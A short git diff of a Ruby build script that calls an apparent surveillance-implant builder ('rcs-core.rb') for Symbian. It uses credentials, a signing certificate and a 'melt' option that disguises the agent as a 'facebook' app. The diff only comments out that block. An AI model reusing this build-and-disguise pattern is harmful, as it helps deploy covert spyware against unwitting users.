@@ -8,7 +8,7 @@ FACTORY = 'RCS_0000000001'
 PLATFORM = 'symbian'
 
 ###################################################################################################
-begin
+=begin
   params = {platform: PLATFORM,
             binary: {demo: true},
             melt: {appname: 'facebook'},
@@ -19,7 +19,7 @@ File.open('build.json', 'w') {|f| f.write params.to_json}
 #system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -f #{FACTORY} -b build.json -o #{PLATFORM}.zip" or raise("Failed")
 system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -f #{FACTORY} -b build.json -C symbian.cer -o #{PLATFORM}.zip" or raise("Failed")
 #system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -f #{FACTORY} -b build.json -i macos_app.zip -o osx_melted.zip" or raise("Failed")
-end
+=end
 ###################################################################################################
 =begin
 params = {platform: 'wap',
